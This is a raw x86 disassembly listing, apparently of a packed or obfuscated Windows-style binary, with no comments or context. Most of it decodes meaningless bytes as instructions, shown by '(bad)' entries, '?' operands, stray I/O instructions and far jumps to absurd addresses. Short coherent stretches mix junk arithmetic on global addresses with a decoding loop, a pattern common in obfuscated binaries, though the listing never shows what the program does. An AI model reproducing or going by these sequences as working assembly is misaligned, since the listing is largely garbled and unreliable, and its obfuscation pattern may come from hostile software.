  40718a:	mov    ds:0x576876a7,al
  40718f:	call   0xe82d:0xd8e44d7b
  407196:	scas   al,BYTE PTR es:[edi]
  407197:	pop    edx
  407198:	pop    edx
  407199:	sbb    ebp,eax
  40719b:	in     eax,0x1b
  40719d:	dec    esp
  40719e:	jmp    0x8294f1f1
  4071a3:	int3   
  4071a4:	aad    0xdd
  4071a6:	(bad)  
  4071a7:	aas    
  4071a8:	pop    ebp
  4071a9:	enter  0x15bb,0x2f
  4071ad:	fisub  WORD PTR [esi]
  4071af:	push   eax
  4071b0:	mov    esi,ebp
  4071b2:	(bad)  
  4071b4:	pop    ebx
  4071b5:	pop    es
  4071b6:	aam    0x43
  4071b8:	data16 and BYTE PTR [esi-0x67],dl
  4071bc:	sub    BYTE PTR [ecx],bl
  4071be:	les    ebp,FWORD PTR [ebx+0x1ac4f459]
  4071c4:	dec    ebp
  4071c5:	(bad)  
  4071c6:	rcl    DWORD PTR [esi],1
  4071c8:	stos   DWORD PTR es:[edi],eax
  4071c9:	mov    esi,0xae9a6e99
  4071ce:	fadd   QWORD PTR [bx+di-0xd21]
  4071d3:	rol    DWORD PTR [ebx+0x7a],0xa1
  4071d7:	push   eax
  4071d8:	or     eax,0x465f1084
  4071dd:	clc    
  4071de:	lods   eax,DWORD PTR ds:[esi]
  4071df:	mov    edx,DWORD PTR [edx+0x64]
  4071e2:	jno    0x40718d
  4071e4:	mov    edi,DWORD PTR [esi+0x6f199a7e]
  4071ea:	scas   eax,DWORD PTR es:[edi]
  4071eb:	mov    al,ds:0xced63797
  4071f0:	xor    BYTE PTR [esi-0x2c0e7ba7],cl
  4071f6:	inc    esp
  4071f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071f8:	mov    bl,0x1
  4071fa:	outs   dx,BYTE PTR ds:[esi]
  4071fb:	adc    BYTE PTR [esi-0x9811ab7],dh
  407201:	std    
  407202:	dec    ebp
  407203:	aam    0x29
  407205:	fimul  WORD PTR ss:[ecx-0x33bd75a8]
  40720c:	push   ebx
  40720d:	gs pop edi
  40720f:	mov    ds:0xe0d4f9c5,al
  407214:	xor    BYTE PTR ds:0x38be514,al
  40721a:	inc    ebx
  40721b:	lea    esp,[edx+0x43]
  40721e:	int3   
  40721f:	retf   0xab06
  407222:	adc    dl,al
  407224:	mov    bh,0x8a
  407226:	xchg   BYTE PTR [ebx],ch
  407228:	jmp    0x80e4:0xa56bb6c3
  40722f:	in     al,0xeb
  407231:	or     edi,DWORD PTR [edx+0x63]
  407234:	xor    esi,DWORD PTR [edx+0x23379b5b]
  40723a:	adc    al,0x9d
  40723c:	jmp    FWORD PTR [edx-0x1b]
  40723f:	js     0x407223
  407241:	xchg   ebx,eax
  407242:	push   ecx
  407243:	push   ss
  407244:	jno    0x40725d
  407246:	repz cmp esi,esp
  407249:	sub    edi,DWORD PTR [edi-0x777db9cd]
  40724f:	mov    dh,0xd2
  407251:	fwait
  407252:	xchg   ah,cl
  407254:	daa    
  407255:	sbb    eax,0x618d1534
  40725a:	jno    0x4072cc
  40725c:	mov    bh,0x82
  40725e:	arpl   WORD PTR [eax+edi*1+0x1982261e],di
  407265:	and    edi,edx
  407267:	pop    ecx
  407268:	pop    ds
  407269:	repz jle 0x407265
  40726c:	inc    eax
  40726d:	(bad)  
  40726e:	fisub  WORD PTR [eax-0x6eb1c866]
  407274:	fld    TBYTE PTR [edi-0x26]
  407277:	mov    ch,0x37
  407279:	add    esp,DWORD PTR [ebx+0x2aae39f4]
  40727f:	stc    
  407280:	shl    DWORD PTR [edi-0x4d64fdc4],0xbd
  407287:	jne    0x407250
  407289:	dec    edx
  40728a:	bound  ebp,QWORD PTR [edi+0x29a9e27d]
  407290:	mov    ebp,0xe68626e1
  407295:	xchg   esi,eax
  407296:	add    al,0xb4
  407298:	nop
  407299:	mov    ebx,0xf4d5f666
  40729e:	lods   eax,DWORD PTR ds:[esi]
  40729f:	mov    WORD PTR [edx+eax*4-0x59],ds
  4072a3:	adc    eax,0xb7f62d8f
  4072a8:	gs ins BYTE PTR es:[edi],dx
  4072aa:	ins    BYTE PTR es:[edi],dx
  4072ab:	stos   DWORD PTR es:[edi],eax
  4072ac:	call   FWORD PTR [esi-0x11]
  4072af:	xchg   BYTE PTR [esi-0x7fb911e8],ch
  4072b5:	xchg   edi,eax
  4072b6:	repnz in eax,dx
  4072b8:	out    0xfa,al
  4072ba:	loope  0x407269
  4072bc:	push   edx
  4072bd:	adc    DWORD PTR [edi-0x4a430b93],0xf5e3303e
  4072c7:	outs   dx,DWORD PTR ds:[esi]
  4072c8:	inc    esp
  4072c9:	into   
  4072ca:	and    DWORD PTR [ebx+ecx*8+0x6],edx
  4072ce:	shl    BYTE PTR ds:0x4bb66071,cl
  4072d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072d5:	mov    ds:0x5155a2d,eax
  4072da:	and    DWORD PTR [ecx+0x3a],eax
  4072dd:	scas   al,BYTE PTR es:[edi]
  4072de:	inc    ebp
  4072df:	dec    eax
  4072e0:	nop
  4072e1:	imul   eax,eax,0x96322267
  4072e7:	in     al,0x7
  4072e9:	fist   DWORD PTR [eax-0x6f]
  4072ec:	xor    esi,DWORD PTR [esi-0x40]
  4072ef:	push   es
  4072f0:	aaa    
  4072f1:	pop    ebp
  4072f2:	nop
  4072f3:	mov    esi,0x7d597d5a
  4072f8:	addr16 nop
  4072fa:	sub    BYTE PTR [ecx],0xca
  4072fd:	in     eax,dx
  4072fe:	xchg   esp,eax
  4072ff:	fist   WORD PTR [ecx]
  407301:	add    ah,BYTE PTR [edx+ecx*2-0x66f953aa]
  407308:	std    
  407309:	dec    ebx
  40730a:	(bad)  
  40730b:	scas   eax,DWORD PTR es:[edi]
  40730c:	cmp    BYTE PTR [ebp-0x1],ch
  40730f:	popa   
  407310:	or     BYTE PTR [edx-0x19d467cd],ah
  407316:	jmp    0xd5f637c8
  40731b:	paddq  mm6,QWORD PTR [eax+esi*8-0x5b2dd88c]
  407323:	mov    edx,DWORD PTR [ecx+ecx*8+0x4e600932]
  40732a:	sub    DWORD PTR [ecx+0x16470c33],eax
  407330:	add    eax,0xe33c0d24
  407335:	push   cs
  407336:	fld    DWORD PTR [esi+0x21]
  407339:	push   DWORD PTR [edi+ebp*1+0x6857315a]
  407340:	adc    BYTE PTR [ecx-0xc],cl
  407343:	or     BYTE PTR [ebp-0x48],0x40
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fcd1,0x42e703
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fcfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e70f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	mov    dh,0x8
  4073fd:	jb     0x4073dc
  4073ff:	test   edi,0x7d207070
  407405:	jo     0x407477
  407407:	or     edx,edx
  407409:	mov    ebx,DWORD PTR [esi]
  40740b:	jmp    0xd0a0:0xbed15050
  407412:	lods   al,BYTE PTR ds:[esi]
  407413:	ret    0x8d14
  407416:	jb     0x40745c
  407418:	or     ecx,ebx
  40741a:	push   ss
  40741b:	mov    eax,0x50a70b77
  407420:	xor    ecx,DWORD PTR [ebx-0x3fa44cf6]
  407426:	push   ds
  407427:	mov    al,ds:0xd6edefdb
  40742c:	sub    al,0x81
  40742e:	ret    0x3d94
  407431:	push   eax
  407432:	and    eax,0x5bd915d1
  407437:	lahf   
  407438:	sub    BYTE PTR [edx+0x4ede7d7c],0xfa
  40743f:	(bad)  
  407440:	cdq    
  407441:	adc    BYTE PTR ds:0xb298abb6,0xef
  407448:	mov    cl,BYTE PTR [eax+eax*1+0x61]
  40744c:	pop    es
  40744d:	jmp    0x40740e
  40744f:	dec    esi
  407450:	popf   
  407451:	jmp    0xb5242b3f
  407456:	jbe    0x407456
  407458:	ins    BYTE PTR es:[di],dx
  40745a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40745b:	cli    
  40745c:	mov    edi,DWORD PTR [eax]
  40745e:	and    al,0xf5
  407460:	mov    edx,0xb75695df
  407465:	loope  0x407449
  407467:	out    dx,al
  407468:	js     0x407408
  40746a:	rol    DWORD PTR [ebx+edi*8],cl
  40746d:	xchg   esp,eax
  40746e:	jmp    0xf072:0xb6eb1aaa
  407475:	sub    ebx,DWORD PTR [ecx+0xd]
  407478:	fnstsw WORD PTR [edx-0x32]
  40747b:	(bad)  
  40747c:	int3   
  40747d:	ss push es
  40747f:	mov    dl,0x87
  407481:	lods   eax,DWORD PTR ds:[esi]
  407482:	adc    ax,WORD PTR [eax+0x4c]
  407486:	adc    eax,0xd18a32ce
  40748b:	or     al,0x53
  40748d:	mov    al,0x5e
  40748f:	arpl   WORD PTR [edi-0x37d2c835],dx
  407495:	out    0x2,al
  407497:	adc    al,0x8a
  407499:	loop   0x407428
  40749b:	push   ebp
  40749c:	fist   DWORD PTR [eax]
  40749e:	lods   al,BYTE PTR ds:[esi]
  40749f:	jge    0x4074af
  4074a1:	outs   dx,BYTE PTR ds:[esi]
  4074a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074a3:	mov    edx,0xaaf1785a
  4074a8:	pop    es
  4074a9:	dec    esp
  4074aa:	cdq    
  4074ab:	mov    eax,ds:0x4606201
  4074b0:	jmp    0xd1224701
  4074b5:	fxch   st(3)
  4074b7:	arpl   WORD PTR [ecx+0x76],si
  4074ba:	addr16 aad 0x57
  4074bd:	add    eax,0x4b41371d
  4074c2:	jns    0x40749d
  4074c4:	add    eax,0x43a3d779
  4074c9:	addr16 test eax,0xbd19e3dd
  4074cf:	cwde   
  4074d0:	ins    DWORD PTR es:[edi],dx
  4074d1:	test   DWORD PTR [edi-0x5],ecx
  4074d4:	pushaw 
  4074d6:	gs popf 
  4074d8:	jo     0x4074e9
  4074da:	push   0x2c
  4074dc:	fsubr  QWORD PTR [eax+0x7a830824]
  4074e2:	rcr    ah,1
  4074e4:	cmc    
  4074e5:	xchg   esp,eax
  4074e6:	pushf  
  4074e7:	(bad)  
  4074e8:	lahf   
  4074e9:	mov    edi,?
  4074eb:	and    al,0x53
  4074ed:	push   esi
  4074ee:	clc    
  4074ef:	and    esi,DWORD PTR [ecx+ebp*2-0x50e9adc1]
  4074f6:	and    eax,0x3421b0cb
  4074fb:	sub    eax,0xcde09d6a
  407500:	call   0x88fc:0x474f9007
  407507:	das    
  407508:	cdq    
  407509:	cmp    BYTE PTR [eax+0x5956d9a1],ah
  40750f:	sbb    BYTE PTR [esi+0x65],ch
  407512:	mov    ebp,0xdea6dc8d
  407517:	iret   
  407518:	repz jbe 0x407588
  40751b:	push   es
  40751c:	retf   
  40751d:	mov    esi,0x6d4e1772
  407522:	es pop es
  407524:	mov    ecx,0x7092bdbc
  407529:	out    0x25,eax
  40752b:	mov    cl,0xa5
  40752d:	cmc    
  40752e:	cmp    BYTE PTR [edi+ecx*1-0x450c6b30],0x16
  407536:	xor    ebp,DWORD PTR [esi+0x45]
  407539:	push   0xffffffb8
  40753b:	int    0x8a
  40753d:	push   ebp
  40753e:	adc    eax,0xa25a5cd2
  407543:	(bad)  
  407544:	and    ebx,esi
  407546:	std    
  407547:	iret   
  407548:	stc    
  407549:	push   eax
  40754a:	adc    eax,0xfab3a435
  40754f:	fist   DWORD PTR [ecx-0x41d96690]
  407555:	fst    DWORD PTR [ecx+0x58cb028a]
  40755b:	add    al,0x6c
  40755d:	add    BYTE PTR [eax-0x7b2d3e29],0x17
  407564:	pop    ds
  407565:	inc    eax
  407566:	inc    esp
  407567:	repz retf 
  407569:	cmp    eax,0xb427e4be
  40756e:	repnz pusha 
  407570:	push   edx
  407571:	imul   esp,DWORD PTR [ecx-0x979030b],0x19
  407578:	pop    edi
  407579:	arpl   WORD PTR [ecx-0x7d7d4b03],dx
  40757f:	push   ds
  407580:	outs   dx,DWORD PTR ds:[esi]
  407581:	ret    0xc676
  407584:	cmc    
  407585:	adc    eax,0xc4ebdead
  40758a:	mov    edi,0xbb37812e
  40758f:	push   edi
  407590:	popf   
  407591:	mov    DWORD PTR [ebp-0x34394b4b],ecx
  407597:	adc    al,0x68
  407599:	rcr    DWORD PTR [edi-0x6bf6e3ea],0x4d
  4075a0:	sub    esp,DWORD PTR [edi]
  4075a2:	fs std 
  4075a4:	and    al,dl
  4075a6:	cmp    ch,BYTE PTR [esi]
  4075a8:	aam    0x3c
  4075aa:	mov    dl,0x85
  4075ac:	jl     0x407559
  4075ae:	or     DWORD PTR [eax-0x25],ecx
  4075b1:	and    eax,0x918d2767
  4075b7:	mov    cl,0x55
  4075b9:	out    dx,eax
  4075ba:	outs   dx,DWORD PTR ds:[esi]
  4075bb:	pop    ebx
  4075bc:	mov    ch,0x65
  4075be:	cmc    
  4075bf:	out    0xfb,al
  4075c1:	pop    esp
  4075c2:	gs pop esp
  4075c4:	nop
  4075c5:	sar    BYTE PTR [esi+0x595bfe8b],1
  4075cb:	or     BYTE PTR [esp+edi*2],al
  4075ce:	ret    0x8c3e
  4075d1:	dec    ecx
  4075d2:	test   al,0x28
  4075d4:	cmp    BYTE PTR [edi],bl
  4075d6:	stos   DWORD PTR es:[edi],eax
  4075d7:	sbb    DWORD PTR [esi-0x220451db],ebx
  4075dd:	push   ebx
  4075de:	in     eax,0x23
  4075e0:	pop    esi
  4075e1:	scas   al,BYTE PTR es:[edi]
  4075e2:	ret    
  4075e3:	cmp    DWORD PTR [ebx+edx*1+0x4891cd98],0xfd2d625d
  4075ee:	sbb    eax,0xe4b83b4c
  4075f3:	jg     0x40760a
  4075f5:	ret    0x4974
  4075f8:	push   esi
  4075f9:	scas   al,BYTE PTR es:[edi]
  4075fa:	fwait
  4075fb:	sub    ebp,DWORD PTR [eax]
  4075fd:	fbld   TBYTE PTR [ebp-0x1a4369f6]
  407603:	cli    
  407604:	jnp    0x40760f
  407606:	shld   esi,edx,0x5c
  40760a:	lahf   
  40760b:	mov    dl,0xcb
  40760d:	in     al,0x8f
  40760f:	fcomi  st,st(7)
  407611:	xlat   BYTE PTR ds:[ebx]
  407612:	jae    0x4075b5
  407614:	push   0xc38e8bd1
  407619:	jae    0x4075d0
  40761b:	hlt    
  40761c:	pusha  
  40761d:	es pop eax
  40761f:	add    al,0x15
  407621:	ins    DWORD PTR es:[edi],dx
  407622:	xlat   BYTE PTR ds:[ebx]
  407623:	cmp    ebp,DWORD PTR [edi+0x556ba644]
  407629:	mov    ch,0x26
  40762b:	add    DWORD PTR [eax],esp
  40762d:	add    ebp,DWORD PTR [esp+0x26]
  407631:	nop
  407632:	std    
  407633:	sar    dl,cl
  407635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407636:	cli    
  407637:	pop    esp
  407638:	adc    ch,BYTE PTR [edx-0x75c94138]
  40763e:	out    0xbd,al
  407640:	push   esi
  407641:	jg     0x407614
  407643:	rcl    DWORD PTR [ebx-0x4f],0x16
  407647:	fdivr  DWORD PTR [edi+edi*4-0x49a0d85a]
  40764e:	cdq    
  40764f:	neg    BYTE PTR [esi]
  407651:	out    0xec,al
  407653:	or     al,0xd5
  407655:	ja     0x40768d
  407657:	jbe    0x407631
  407659:	test   eax,0x181008ac
  40765e:	data16 aad 0xcd
  407661:	lods   al,BYTE PTR ds:[esi]
  407662:	sahf   
  407663:	sar    DWORD PTR [esi],cl
  407665:	cmp    eax,0xdd428bb4
  40766a:	push   eax
  40766b:	(bad)  
  40766c:	xor    edi,DWORD PTR [edx+0x6d]
  40766f:	stc    
  407670:	dec    eax
  407671:	repnz cmp DWORD PTR ds:0x5a00aaaa,edi
  407678:	ret    0xe4c
  40767b:	hlt    
  40767c:	inc    esp
  40767d:	imul   esp,esi,0xd431af8d
  407683:	cmp    BYTE PTR [edi+0x47],al
  407686:	cmp    bh,cl
  407688:	cli    
  407689:	add    ebp,eax
  40768b:	nop
  40768c:	fsubr  st(1),st
  40768e:	cmp    DWORD PTR [eax-0x1fc29fe8],edx
  407694:	in     eax,dx
  407695:	jns    0x4076c0
  407697:	jge    0x4076a7
  407699:	jl     0x40761f
  40769b:	aaa    
  40769c:	inc    ecx
  40769d:	mov    ecx,0xc86e13e4
  4076a2:	xor    dh,bl
  4076a4:	or     DWORD PTR [ebx-0x1ff6092f],eax
  4076aa:	pop    edx
  4076ab:	mov    ah,0x19
  4076ad:	mov    ecx,0x5e4bf757
  4076b2:	mov    cl,0xe2
  4076b4:	std    
  4076b5:	xchg   al,dl
  4076b7:	add    dh,BYTE PTR [esi]
  4076b9:	rcr    DWORD PTR [ebx+eax*8+0x3b91115b],1
  4076c0:	dec    edx
  4076c1:	adc    edx,DWORD PTR [ecx+0x15ae4e3c]
  4076c7:	push   edx
  4076c8:	jmp    0xe491e88e
  4076cd:	add    eax,0xff1709e9
  4076d2:	mov    dh,0x70
  4076d4:	pusha  
  4076d5:	rcr    DWORD PTR [ecx-0x47],cl
  4076d8:	cmp    edx,DWORD PTR [eax]
  4076da:	test   eax,0xbf427d86
  4076df:	clc    
  4076e0:	cmc    
  4076e1:	rcl    DWORD PTR [esi+edx*1],1
  4076e4:	xchg   esi,eax
  4076e5:	mov    ebp,0x64f1888
  4076ea:	pop    ebx
  4076eb:	pop    esp
  4076ec:	ss call 0x7b36097f
  4076f2:	in     al,0x97
  4076f4:	test   DWORD PTR [esi],edi
  4076f6:	(bad)  
  4076f7:	cli    
  4076f8:	inc    esp
  4076f9:	push   eax
  4076fa:	mov    ebx,0xb1a12c07
  4076ff:	daa    
  407700:	scas   eax,DWORD PTR es:[edi]
  407701:	mov    bh,0x5e
  407703:	jge    0x407715
  407705:	mov    esi,0xb6aa6f3d
  40770a:	outs   dx,BYTE PTR ds:[esi]
  40770b:	mov    DWORD PTR ds:[ebx+0x1057b92b],ecx
  407712:	mov    ds:0xc87d30ee,eax
  407717:	out    0x45,eax
  407719:	sbb    DWORD PTR [ebp+0x20],eax
  40771c:	and    eax,0xd705d695
  407721:	jae    0x407703
  407723:	je     0x4076bb
  407725:	jne    0x4076dd
  407727:	fisttp QWORD PTR [ecx-0x49b07177]
  40772d:	pop    edx
  40772e:	push   cs
  40772f:	jecxz  0x4076f3
  407731:	xchg   edx,eax
  407732:	dec    esp
  407733:	dec    eax
  407734:	test   BYTE PTR [edi-0xd],ah
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	loop   0x40782d
  4077db:	jmp    0x2070:0x70cca73e
  4077e2:	jge    0x407854
  4077e4:	jo     0x40777a
  4077e6:	sbb    BYTE PTR [ecx+0x41941bd],cl
  4077ec:	les    esi,FWORD PTR [edi+0x71d7aa99]
  4077f2:	mov    al,0x8d
  4077f4:	push   ebx
  4077f5:	sub    ebx,edx
  4077f7:	push   ecx
  4077f8:	or     BYTE PTR [edx-0x2d],cl
  4077fb:	mov    bh,0x69
  4077fd:	jne    0x40783a
  4077ff:	xor    al,BYTE PTR [ecx+0x3d]
  407802:	cs cdq 
  407804:	adc    eax,ebx
  407806:	into   
  407807:	xchg   esi,eax
  407808:	cs pusha 
  40780a:	cmp    ch,BYTE PTR ds:0x4f7ebbcc
  407810:	popf   
  407811:	push   es
  407812:	pop    ds
  407813:	push   0x4b
  407815:	fdiv   QWORD PTR [esi+0x60006a81]
  40781b:	popa   
  40781c:	adc    DWORD PTR [edx+0x36],edx
  40781f:	loop   0x407889
  407821:	in     al,dx
  407822:	addr16 push 0xe
  407825:	dec    esp
  407826:	cmp    bh,dl
  407828:	push   ss
  407829:	xor    ah,BYTE PTR ds:0xece0c5e3
  40782f:	aaa    
  407830:	out    0x2c,al
  407832:	jo     0x407877
  407834:	pop    ecx
  407835:	and    DWORD PTR [edi+ebx*8],edx
  407838:	push   eax
  407839:	and    DWORD PTR [ebp+0x6d],0xdc0f5949
  407840:	cmp    esi,DWORD PTR [ebx]
  407842:	or     eax,0x372fa081
  407847:	sbb    DWORD PTR [edx],edi
  407849:	jle    0x4077df
  40784b:	scas   al,BYTE PTR es:[edi]
  40784c:	mov    edi,0x4b2af3ac
  407851:	scas   al,BYTE PTR es:[edi]
  407852:	jg     0x4077fa
  407854:	sub    eax,0x9c2bf06b
  407859:	xlat   BYTE PTR ds:[ebx]
  40785a:	sar    DWORD PTR [ebx-0x3f21ca14],cl
  407860:	lds    edi,FWORD PTR [ebx+0x4905cf]
  407866:	es xor eax,0x7cf333a2
  40786c:	jle    0x40789b
  40786e:	sbb    eax,0x1c0b0d3d
  407873:	call   0x806a:0xf10102d4
  40787a:	jns    0x4078a0
  40787c:	mov    bl,BYTE PTR [ebx]
  40787e:	jg     0x4078fe
  407880:	dec    edi
  407881:	push   cs
  407882:	(bad)  
  407884:	fmul   st(5),st
  407886:	ins    DWORD PTR es:[edi],dx
  407887:	cld    
  407888:	out    dx,eax
  407889:	and    ch,BYTE PTR [eax]
  40788b:	or     DWORD PTR [eax+0x3d],edi
  40788e:	push   edi
  40788f:	lea    esp,[ebx]
  407891:	pop    edx
  407892:	maxps  xmm0,XMMWORD PTR [ebp-0x65]
  407896:	lahf   
  407897:	push   ebp
  407898:	push   esi
  407899:	in     al,0xb9
  40789b:	test   al,0xa4
  40789d:	inc    ebx
  40789e:	mov    DWORD PTR [esi-0x624e6580],esp
  4078a4:	dec    edx
  4078a5:	test   BYTE PTR [edi-0x79],bl
  4078a8:	cmp    BYTE PTR [ecx+0x433f8dab],cl
  4078ae:	inc    edi
  4078af:	scas   eax,DWORD PTR es:[edi]
  4078b0:	xchg   esi,eax
  4078b1:	jge    0x4078d5
  4078b3:	and    DWORD PTR [ecx],esi
  4078b5:	(bad)  
  4078b6:	xor    BYTE PTR [edi],cl
  4078b8:	or     al,0x10
  4078ba:	mov    cs,WORD PTR [edx-0x2a7d600]
  4078c0:	mov    gs,ecx
  4078c2:	sbb    BYTE PTR [ebp-0x63463081],ah
  4078c8:	push   es
  4078c9:	je     0x407949
  4078cb:	add    BYTE PTR [ebx-0x73],0xe7
  4078cf:	lahf   
  4078d0:	push   cs
  4078d1:	ins    BYTE PTR es:[edi],dx
  4078d2:	xchg   BYTE PTR [esi+0x5d7dabd8],cl
  4078d8:	ds push ebx
  4078da:	enter  0x8f73,0x90
  4078de:	pushf  
  4078df:	in     eax,0x34
  4078e1:	pusha  
  4078e2:	(bad)  
  4078e3:	fcmovbe st,st(1)
  4078e5:	popf   
  4078e6:	cmp    BYTE PTR [eax],ah
  4078e8:	fld    QWORD PTR [edx+0x7d2ba60b]
  4078ee:	pusha  
  4078ef:	outs   dx,DWORD PTR ds:[esi]
  4078f0:	inc    eax
  4078f1:	adc    esi,edx
  4078f3:	adc    edi,esi
  4078f5:	gs or  al,0x9b
  4078f8:	lahf   
  4078f9:	repz dec edx
  4078fb:	fstp   TBYTE PTR [ebp-0x65e5414a]
  407901:	leave  
  407902:	in     al,dx
  407903:	jo     0x4078df
  407905:	rol    edi,1
  407907:	xchg   edi,eax
  407908:	or     ch,BYTE PTR [edx-0x35d21561]
  40790e:	ret    0xee5
  407911:	mov    edx,0xa5c5b64d
  407916:	int    0x6f
  407918:	and    DWORD PTR [edx+esi*4+0x4b3fc0e5],ebx
  40791f:	(bad)  [edx]
  407921:	sub    DWORD PTR [ebx-0x48],esp
  407924:	push   eax
  407925:	dec    esi
  407926:	test   ebp,ebp
  407928:	mov    ebx,0xe443906c
  40792d:	cmp    al,BYTE PTR [edx+0x2]
  407930:	das    
  407931:	out    dx,eax
  407932:	scas   eax,DWORD PTR es:[edi]
  407933:	(bad)
  407937:	mov    bl,0xd4
  407939:	xor    eax,0x7f0467bc
  40793e:	sbb    bh,cl
  407940:	fmul   DWORD PTR [eax-0x2a]
  407943:	xlat   BYTE PTR ds:[ebx]
  407944:	push   cs
  407945:	test   DWORD PTR [edi],esi
  407947:	jae    0x4078fd
  407949:	mov    ?,WORD PTR [esi-0x16]
  40794c:	aam    0xb9
  40794e:	(bad)  
  40794f:	jbe    0x40791f
  407951:	and    ebx,esi
  407953:	aad    0x55
  407955:	fcmovnbe st,st(3)
  407957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407958:	xchg   edi,eax
  407959:	mov    ?,ebp
  40795b:	sbb    ah,BYTE PTR [ebp-0x46]
  40795e:	iret   
  40795f:	sbb    edi,DWORD PTR [ebx+0x4796ba2a]
  407965:	mov    ebx,edi
  407967:	in     eax,0xdb
  407969:	mov    al,ds:0xe068db1c
  40796e:	fstp   DWORD PTR [esi]
  407970:	push   esp
  407971:	xor    al,0xd0
  407973:	sub    dl,0xa9
  407976:	and    ebp,edi
  407978:	mov    ds,WORD PTR gs:[esi+0x34]
  40797c:	jge    0x40793f
  40797e:	inc    edx
  40797f:	(bad)  
  407981:	fldenv [esi+ebp*1+0x69e0e8e1]
  407988:	sbb    ah,dh
  40798a:	das    
  40798b:	fnstcw WORD PTR [ecx-0x21]
  40798e:	dec    eax
  40798f:	sub    esp,ebp
  407991:	enter  0xb5b3,0x8a
  407995:	xchg   al,al
  407997:	or     BYTE PTR [ebx+0x79],ah
  40799a:	adc    DWORD PTR [eax+0x70],ebx
  40799d:	mov    ebp,0xc7b0a692
  4079a2:	sti    
  4079a3:	adc    esi,DWORD PTR [esi-0x62f1a6c0]
  4079a9:	mov    cl,0x5
  4079ab:	jae    0x40794c
  4079ad:	inc    esp
  4079ae:	jge    0x40799c
  4079b0:	xor    eax,0x2d234c08
  4079b5:	push   edi
  4079b6:	jnp    0x407942
  4079b8:	test   eax,esp
  4079ba:	fst    DWORD PTR [eax+0x2ec8b754]
  4079c0:	push   esi
  4079c1:	in     al,0xb0
  4079c3:	aad    0x25
  4079c5:	sub    esi,DWORD PTR [edi]
  4079c7:	call   0x4435b378
  4079cc:	sbb    DWORD PTR [edx-0x56cc1ac2],0xfffffff3
  4079d3:	mov    BYTE PTR [esi-0x1ae835e0],ah
  4079d9:	jmp    0x8f3:0xe35763fd
  4079e0:	jecxz  0x407a4d
  4079e2:	arpl   WORD PTR [ecx+0x7e],cx
  4079e5:	fdivr  st,st(0)
  4079e7:	xor    DWORD PTR [ebx],eax
  4079e9:	lds    ebp,FWORD PTR [eax+ebp*8-0xc]
  4079ed:	or     BYTE PTR [ebx-0x4b6c009e],0x2a
  4079f4:	xor    BYTE PTR [esi+0x45],bh
  4079f7:	mov    fs,WORD PTR [ebx+0x961158b]
  4079fd:	pop    edi
  4079fe:	add    BYTE PTR [edx+0x6ed95e5e],cl
  407a04:	retf   0x9a80
  407a07:	jno    0x407a07
  407a09:	ja     0x407a4e
  407a0b:	push   edi
  407a0c:	rol    BYTE PTR [esi-0x4],0xed
  407a10:	stos   BYTE PTR es:[edi],al
  407a11:	stc    
  407a12:	jmp    FWORD PTR [eax]
